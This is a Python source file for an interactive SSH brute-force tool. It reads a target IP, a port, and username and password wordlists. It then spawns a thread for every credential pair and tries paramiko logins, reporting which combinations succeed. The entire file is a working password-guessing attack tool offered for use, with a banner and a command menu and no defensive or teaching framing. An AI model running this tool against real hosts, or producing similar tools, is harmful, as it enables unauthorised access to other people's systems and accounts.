import paramiko
import threading
from colorama import Fore, Style, init
import sys

init(autoreset=True)

ascii_art = """
███████╗███████╗██╗  ██╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔════╝██╔════╝██║  ██║    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
███████╗███████╗███████║    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
╚════██║╚════██║██╔══██║    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
███████║███████║██║  ██║    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
╚══════╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
"""

def try_login(ip, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, port, username, password, timeout=3)
        print(f"{Fore.GREEN}Login successful with {username}:{password}{Style.RESET_ALL}")
    except paramiko.AuthenticationException:
        print(f"{Fore.RED}Login failed with {username}:{password}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.YELLOW}Error: {str(e)}{Style.RESET_ALL}")
    finally:
        ssh.close()

def sshbrute():
    target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")
    target_port = int(input(f"{Fore.CYAN}Enter target port: {Style.RESET_ALL}"))
    
    username_file = input(f"{Fore.CYAN}Enter path to username list: {Style.RESET_ALL}")
    password_file = input(f"{Fore.CYAN}Enter path to password list: {Style.RESET_ALL}")
    
    with open(username_file, 'r') as uf:
        username_list = uf.read().splitlines()
    
    with open(password_file, 'r') as pf:
        password_list = pf.read().splitlines()
    
    main(target_ip, target_port, username_list, password_list)

def main(ip, port, username_list, password_list):
    threads = []
    for username in username_list:
        for password in password_list:
            thread = threading.Thread(target=try_login, args=(ip, port, username, password))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()

def show_help():
    print(f"""
{Fore.YELLOW}Available Commands:{Style.RESET_ALL}
  {Fore.GREEN}sshbrute{Style.RESET_ALL} - Start the SSH brute force attack
  {Fore.GREEN}help{Style.RESET_ALL}     - Show this help message
  {Fore.GREEN}exit{Style.RESET_ALL}     - Exit the application
""")

def command_interface():
    while True:
        command = input(f"{Fore.BLUE}Command: {Style.RESET_ALL}")
        if command == "sshbrute":
            sshbrute()
        elif command == "help":
            show_help()
        elif command == "exit":
            print(f"{Fore.GREEN}Exiting...{Style.RESET_ALL}")
            sys.exit(0)
        else:
            print(f"{Fore.RED}Unknown command: {command}{Style.RESET_ALL}")
            show_help()

if __name__ == "__main__":
    print(ascii_art)
    show_help()
    command_interface()
